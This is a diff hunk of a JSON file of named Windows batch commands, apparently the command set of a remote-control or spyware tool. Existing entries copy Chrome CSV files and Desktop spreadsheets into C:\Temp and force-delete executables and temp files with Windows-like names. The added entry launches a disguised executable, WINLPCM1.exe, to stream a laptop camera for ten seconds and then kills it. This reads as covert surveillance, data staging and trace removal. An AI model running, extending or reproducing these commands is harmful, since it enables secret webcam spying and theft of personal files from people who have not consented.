@@ -34,6 +34,7 @@
   "______cmdCommandsList": ["@echo off","copy \"D:\\Chrome*.csv\" \"C:\\Temp\\string3.txt\""],
   "__________cmdCommandsList": ["@echo off","copy \"C:\\Users\\user\\Desktop\\YILLARA*.xlsx\" \"C:\\Temp\\string3.txt\""],
   "_____del any exe filename starts with___cmdCommandsList": ["@echo off","del /f /q \"C:\\Program Files\\Common Files\\cameraAnalysisEXE*.exe\""],
+  "_____laptop_camStreamFor_10seconds___cmdCommandsList": ["@echo off","start \"\" \"C:\\Program Files\\Common Files\\Services\\WINLPCM1.exe\" & timeout /t 10 /nobreak >nul & taskkill /F /IM WINLPCM1.exe"],
   "_____del any filename starts with___cmdCommandsList": ["@echo off","del /f /q \"C:\\Temp\\WindowsNet*\""],
   "_____del any filename starts with____cmdCommandsList": ["@echo off","del /f /q \"C:\\Temp\\WinSrv*\""],
   "_____del all files in temp folder____cmdCommandsList": ["@echo off","del /f /q \"C:\\Temp\\*\""],
